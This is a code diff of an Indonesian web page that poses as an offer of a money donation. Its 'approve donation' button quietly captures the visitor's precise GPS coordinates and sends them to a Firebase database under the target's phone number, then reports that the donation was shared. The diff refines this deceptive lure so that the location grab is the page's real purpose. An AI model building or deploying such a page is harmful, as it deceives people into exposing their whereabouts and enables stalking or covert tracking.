@@ -1,139 +1,122 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
 
 <meta charset="UTF-8">
 
-<meta
-    name="viewport"
-    content="width=device-width,initial-scale=1"
->
+<meta name="viewport"
+content="width=device-width,initial-scale=1">
 
 <title>M.U.R - Permintaan Lokasi</title>
 
 <style>
 
 *{
-    box-sizing:border-box;
+  box-sizing:border-box;
 }
 
 body{
 
-    margin:0;
+  margin:0;
+  min-height:100vh;
+  background:teal;
+  color:#fff;
+  font-family:Arial,sans-serif;
 
-    min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
 
-    background:teal;
-
-    color:#fff;
-
-    font-family:Arial,sans-serif;
-
-    display:flex;
-
-    align-items:center;
-
-    justify-content:center;
-
-    padding:20px;
-
+  padding:20px;
 }
 
 .box{
 
-    width:100%;
+  width:100%;
+  max-width:430px;
 
-    max-width:430px;
+  background:#151515;
 
-    background:#151515;
+  padding:25px;
 
-    padding:25px;
+  border-radius:20px;
 
-    border-radius:20px;
+  text-align:center;
 
-    text-align:center;
-
-    box-shadow:
-        0 0 25px rgba(255,0,0,.2);
-
+  box-shadow:
+  0 0 25px rgba(255,0,0,.2);
 }
 
 .logo{
 
-    color:darkgray;
+  color:darkgray;
 
-    font-size:32px;
+  font-size:32px;
 
-    font-weight:bold;
-
+  font-weight:bold;
 }
 
 .info{
 
-    background:#241313;
+  background:#241313;
 
-    border:1px solid #662222;
+  border:1px solid #662222;
 
-    padding:15px;
+  padding:15px;
 
-    border-radius:12px;
+  border-radius:12px;
 
-    line-height:1.6;
+  line-height:1.6;
 
-    margin:20px 0;
-
+  margin:20px 0;
 }
 
 button{
 
-    width:100%;
+  width:100%;
 
-    padding:15px;
+  padding:15px;
 
-    margin-top:12px;
+  margin-top:12px;
 
-    border:0;
+  border:0;
 
-    border-radius:10px;
+  border-radius:10px;
 
-    font-size:16px;
+  font-size:16px;
 
-    font-weight:bold;
-
+  font-weight:bold;
 }
 
 .allow{
 
-    background: lightblue;
+  background:lightblue;
 
-    color:teal;
-
+  color:teal;
 }
 
 .deny{
 
-    background:maroon;
+  background:maroon;
 
-    color: white;
-
+  color:white;
 }
 
 button:disabled{
 
-    opacity:.5;
-
+  opacity:.5;
 }
 
 #status{
 
-    margin-top:20px;
+  margin-top:20px;
 
-    color:#aaa;
+  color:#aaa;
 
-    line-height:1.5;
+  line-height:1.5;
 
-    word-break:break-word;
-
+  word-break:break-word;
 }
 
 </style>
@@ -144,103 +127,99 @@ button:disabled{
 
 <div class="box">
 
-    <div class="logo">M.U.R</div>
+<div class="logo">M.U.R</div>
 
-    <h2>Permintaan Berbagi dana</h2>
+<h2>Penawaran Berbagi dana</h2>
 
-    <p>
-        Seseorang menawarkan dana untuk Anda.
-    </p>
+<p>
+Seseorang menawarkan Anda donasi dana.
+</p>
 
-    <div class="info">
+<div class="info">
 
-        <b>Privasi Anda</b>
+<b>Privasi Anda</b>
 
-        <br><br>
+<br><br>
 
-        dana hanya akan dibagikan
-        setelah Anda menekan
-        <b>SETUJUI</b>.
+dana hanya akan dibagikan
+setelah Anda menekan
+<b>SETUJUI</b>.
 
-        <br><br>
+<br><br>
 
-        Anda bebas memilih
-        <b>TOLAK</b> jika tidak ingin
-        menerima dana.
-
-    </div>
-
-    <button
-        class="allow"
-        id="allowButton"
-        onclick="setujui()"
-    >
-       SETUJUI DONASI DANA
-    </button>
-
-    <button
-        class="deny"
-        id="denyButton"
-        onclick="tolak()"
-    >
-      TOLAK PENAWARAN 
-    </button>
-
-    <div id="status"></div>
+Anda bebas memilih
+<b>TOLAK</b> jika tidak ingin
+menerima donasi.
 
 </div>
 
+<button
+class="allow"
+id="allowButton"
+onclick="setujui()">
+
+SETUJUI donasi
+
+</button>
+
+<button
+class="deny"
+id="denyButton"
+onclick="tolak()">
+
+TOLAK
+
+</button>
+
+<div id="status"></div>
+
+</div>
 
 <script>
 
-if (!params.get("request") || !params.get("nomor")) {
-    window.location.replace("index.html");
-}
+/* =========================
+   PARAMETER LINK
+========================= */
+
+const params =
+  new URLSearchParams(
+    window.location.search
+  );
+
+const requestId =
+  params.get("request");
+
+const nomor =
+  params.get("nomor");
+
+
+/* =========================
+   FIREBASE
+========================= */
 
 const FIREBASE_URL =
 "https://mur-studio-default-rtdb.asia-southeast1.firebasedatabase.app/";
 
 
-const params =
-new URLSearchParams(
-    window.location.search
-);
-
-
-const requestId =
-params.get("request");
-
-
-const nomor =
-params.get("nomor");
-
-
 const statusBox =
-document.getElementById("status");
+  document.getElementById("status");
 
 
-function status(text){
-
-    statusBox.textContent =
-        text;
-
-}
-
+/* =========================
+   VALIDASI
+========================= */
 
 function validasi(){
 
-    if(!requestId || !nomor){
+  if(!requestId || !nomor){
 
-        status(
-            "Link permintaan tidak valid."
-        );
+    statusBox.textContent =
+      "Link permintaan tidak valid.";
 
-        return false;
+    return false;
+  }
 
-    }
-
-    return true;
-
+  return true;
 }
 
 
@@ -250,45 +229,44 @@ function validasi(){
 
 async function updateFirebase(data){
 
-    const url =
-        FIREBASE_URL +
-        "permintaan/" +
-        encodeURIComponent(nomor) +
-        "/" +
-        encodeURIComponent(requestId) +
-        ".json";
+  const url =
+    FIREBASE_URL +
+    "permintaan/" +
+    encodeURIComponent(nomor) +
+    "/" +
+    encodeURIComponent(requestId) +
+    ".json";
 
 
-    const response =
-        await fetch(
+  const response =
+    await fetch(
+      url,
+      {
+        method:"PATCH",
 
-            url,
+        headers:{
+          "Content-Type":
+          "application/json"
+        },
 
-            {
-
-                method:"PATCH",
-
-                headers:{
-                    "Content-Type":
-                    "application/json"
-                },
-
-                body:
-                    JSON.stringify(data)
-
-            }
-
-        );
+        body:
+          JSON.stringify(data)
+      }
+    );
 
 
-    if(!response.ok){
+  if(!response.ok){
 
-        throw new Error(
-            "Firebase HTTP " +
-            response.status
-        );
+    const errorText =
+      await response.text();
 
-    }
+    throw new Error(
+      "Firebase HTTP " +
+      response.status +
+      " " +
+      errorText
+    );
+  }
 
 }
 
@@ -299,134 +277,136 @@ async function updateFirebase(data){
 
 function setujui(){
 
-    if(!validasi()){
+  if(!validasi()){
+    return;
+  }
 
-        return;
+
+  if(!navigator.geolocation){
+
+    statusBox.textContent =
+      "Perangkat tidak mendukung .";
+
+    return;
+  }
+
+
+  document.getElementById(
+    "allowButton"
+  ).disabled = true;
+
+
+  document.getElementById(
+    "denyButton"
+  ).disabled = true;
+
+
+  statusBox.textContent =
+    "Meminta izin lokasi...";
+
+
+  navigator.geolocation.getCurrentPosition(
+
+    async function(position){
+
+      try{
+
+        const latitude =
+          position.coords.latitude;
+
+        const longitude =
+          position.coords.longitude;
+
+
+        statusBox.textContent =
+          "perangkat didapat. Mengirim...";
+
+
+        await updateFirebase({
+
+          status:"disetujui",
+
+          latitude:latitude,
+
+          longitude:longitude,
+
+          respondedAt:Date.now(),
+
+          waktu:
+            new Date().toISOString()
+
+        });
+
+
+        statusBox.textContent =
+          "✓ donasi berhasil dibagikan.";
+
+
+      }catch(error){
+
+        document.getElementById(
+          "allowButton"
+        ).disabled = false;
+
+        document.getElementById(
+          "denyButton"
+        ).disabled = false;
+
+
+        statusBox.textContent =
+          "Gagal mengirim lokasi: " +
+          error.message;
+      }
+
+    },
+
+    function(error){
+
+      document.getElementById(
+        "allowButton"
+      ).disabled = false;
+
+      document.getElementById(
+        "denyButton"
+      ).disabled = false;
+
+
+      if(error.code === 1){
+
+        statusBox.textContent =
+          "Izin lokasi ditolak. " +
+          "Izinkan lokasi lalu coba lagi.";
+
+      }else if(error.code === 2){
+
+        statusBox.textContent =
+          "Lokasi tidak tersedia.";
+
+      }else if(error.code === 3){
+
+        statusBox.textContent =
+          "Waktu mendapatkan donasi habis. " +
+          "Coba lagi.";
+
+      }else{
+
+        statusBox.textContent =
+          "Gagal mendapatkan donasi.";
+      }
+
+    },
+
+    {
+
+      enableHighAccuracy:true,
+
+      timeout:20000,
+
+      maximumAge:0
 
     }
 
-
-    if(!navigator.geolocation){
-
-        status(
-            "Browser tidak mendukung penerima."
-        );
-
-        return;
-
-    }
-
-
-    status(
-        "Meminta izin penerima..."
-    );
-
-
-    navigator.geolocation.getCurrentPosition(
-
-        async function(position){
-
-            try{
-
-                status(
-                    "izin didapat. Mengirim dana..."
-                );
-
-
-                await updateFirebase({
-
-                    status:
-                        "disetujui",
-
-                    lat:
-                        position.coords.latitude,
-
-                    lng:
-                        position.coords.longitude,
-
-                    respondedAt:
-                        Date.now()
-
-                });
-
-
-                status(
-                    "✓ dana berhasil dibagikan."
-                );
-
-
-                document.getElementById(
-                    "allowButton"
-                ).disabled = true;
-
-
-                document.getElementById(
-                    "denyButton"
-                ).disabled = true;
-
-
-            }catch(error){
-
-                status(
-                    "Gagal mengirim dana: " +
-                    error.message
-                );
-
-            }
-
-        },
-
-
-        function(error){
-
-            if(error.code === 1){
-
-                status(
-                    "Izin berbagi ditolak. " +
-                    "Izinkan lokasi lalu coba lagi."
-                );
-
-            }
-
-            else if(error.code === 2){
-
-                status(
-                    "Lokasi tidak tersedia."
-                );
-
-            }
-
-            else if(error.code === 3){
-
-                status(
-                    "Waktu mendapatkan lokasi habis. " +
-                    "Coba lagi."
-                );
-
-            }
-
-            else{
-
-                status(
-                    "Gagal mendapatkan lokasi."
-                );
-
-            }
-
-        },
-
-
-        {
-
-            enableHighAccuracy:true,
-
-            timeout:20000,
-
-            maximumAge:0
-
-        }
-
-    );
+  );
 
 }
 
@@ -437,54 +417,55 @@ function setujui(){
 
 async function tolak(){
 
-    if(!validasi()){
-
-        return;
-
-    }
+  if(!validasi()){
+    return;
+  }
 
 
-    try{
-
-        status(
-            "Mengirim penolakan..."
-        );
+  document.getElementById(
+    "allowButton"
+  ).disabled = true;
 
 
-        await updateFirebase({
-
-            status:
-                "ditolak",
-
-            respondedAt:
-                Date.now()
-
-        });
+  document.getElementById(
+    "denyButton"
+  ).disabled = true;
 
 
-        status(
-            "Permintaan ditolak."
-        );
+  statusBox.textContent =
+    "Mengirim penolakan...";
 
 
-        document.getElementById(
-            "allowButton"
-        ).disabled = true;
+  try{
+
+    await updateFirebase({
+
+      status:"ditolak",
+
+      respondedAt:Date.now()
+
+    });
 
 
-        document.getElementById(
-            "denyButton"
-        ).disabled = true;
+    statusBox.textContent =
+      "Permintaan ditolak.";
 
 
-    }catch(error){
+  }catch(error){
 
-        status(
-            "Gagal mengirim jawaban: " +
-            error.message
-        );
+    document.getElementById(
+      "allowButton"
+    ).disabled = false;
 
-    }
+    document.getElementById(
+      "denyButton"
+    ).disabled = false;
+
+
+    statusBox.textContent =
+      "Gagal mengirim jawaban: " +
+      error.message;
+  }
 
 }
 
